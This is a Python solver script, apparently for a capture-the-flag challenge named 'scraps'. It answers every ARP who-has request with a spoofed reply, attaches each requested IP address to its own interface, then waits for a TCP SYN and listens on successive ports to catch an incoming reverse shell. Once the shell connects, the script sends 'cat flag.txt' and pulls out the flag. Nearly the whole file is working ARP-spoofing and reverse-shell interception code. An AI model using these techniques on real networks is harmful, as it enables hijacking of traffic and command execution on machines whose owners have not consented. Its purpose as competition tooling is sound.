# coding: utf-8
import scapy.all as scapy
import capture
import strategy
import logging
import re
import socket
import subprocess
import net
import threading
import time

logger = logging.getLogger(__name__)

class Strategy(strategy.Strategy):
    """
    This strategy solves the scraps challenge by immediatly assuming the IP address asked for by any ARP request.
    It then waits for a TCP SYN, and upon recieving it starts listening for another 10 ports ahead within 15 seconds.
    """
    name = "rolling TCP listener"
    needsip = False
    challenges = ['scraps']

    class ImpersonatorModule(capture.Module):
        """ImpresonatorModule watches for ARP packets and assumes any IP address it sees requested"""
        def __init__(self):
            self.ips = set()
            self.iface = None

        def start(self, sniffer):
            self.iface = sniffer.iface

        def process(self, pkt):
            if all(layer in pkt for layer in (scapy.Ether, scapy.ARP)):
                if pkt[scapy.Ether].src != str(net.ifhwaddr(self.iface)) and pkt[scapy.ARP].op == 1: # who-has
                    resp = scapy.Ether()/scapy.ARP(hwsrc=str(net.ifhwaddr('tap0')), hwdst=pkt.hwsrc, psrc=pkt.pdst, pdst=pkt.psrc, op="is-at")
                    scapy.sendp(resp, iface='tap0')

                    if pkt.pdst not in self.ips:
                        self.ips.add(pkt.pdst)
                        cidr = '{!s}/{:d}'.format(pkt.pdst, 28)
                        logger.info("Attaching new IP address {:s} to {:s}".format(cidr, self.iface))
                        subprocess.run(['ip', 'addr', 'add', cidr, 'dev', self.iface])

    class ReverseShellCatcherModule(capture.Module):
        """ReserveShellCatcherModule determines which port the reserve shell will connect on and listens for it"""
        def __init__(self, flagpattern):
            self.flagpattern = flagpattern
            self.flag = None
            self.iface = None
            self.sniffer = None
            self.bindaddr = None
            self.bindport = None

            self._thread = None
            self._stopevent = threading.Event()

        def start(self, sniffer):
            self.iface = sniffer.iface
            self.sniffer = sniffer
            self._stopevent.clear()

        def stop(self):
            self._stopevent.set()

        def intercept(self):
            while not self._stopevent.is_set():
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                try:
                    addr = (self.bindaddr, self.bindport)
                    logger.debug("Listening on {!s}".format(addr))
                    s.bind(addr)
                    s.listen(1)
                    s.settimeout(1)
                    conn, _ = s.accept()

                    # Now we're talking!
                    s.settimeout(30)
                    conn.sendall(b'cat flag.txt\n')
                    resp = ""
                    while self.flag is None:
                        resp += conn.recv(1024).decode('utf-8')
                        m = re.search(self.flagpattern, resp)
                        if m:
                            self.flag = m.group(0)
                            self.sniffer.stop()
                except OSError as e:
                    if isinstance(e, socket.timeout):
                        self.bindport += 1
                    else:
                        logger.info("Expection while attempting to intercept: {!s}".format(e))
                        time.sleep(1)
                finally:
                    s.close()

        def process(self, pkt):
            if all(layer in pkt for layer in (scapy.Ether, scapy.IP, scapy.TCP)):
                logger.debug(pkt.sprintf("[%Ether.src%]%IP.src%:%TCP.sport% > [%Ether.dst%]%IP.dst%:%TCP.dport% %TCP.flags%"))
                if pkt[scapy.Ether].dst == str(net.ifhwaddr(self.iface)) and pkt[scapy.TCP].flags == 2:
                    self.bindaddr, self.bindport = pkt[scapy.IP].dst, pkt[scapy.TCP].dport
                    if self._thread is None or not self._thread.is_alive():
                        self._thread = threading.Thread(target=self.intercept)
                        self._thread.start()

    def execute(self, iface, flagpattern="flag\{.*?\}", canceltoken=None):
        sniffer = capture.Sniffer(iface=iface)
        interceptor = self.ReverseShellCatcherModule(flagpattern)
        sniffer.register(
            self.ImpersonatorModule(),
            interceptor
        )

        if canceltoken is not None:
            canceltoken.fork(oncancel=sniffer.stop)

        sniffer.run()
        return interceptor.flag
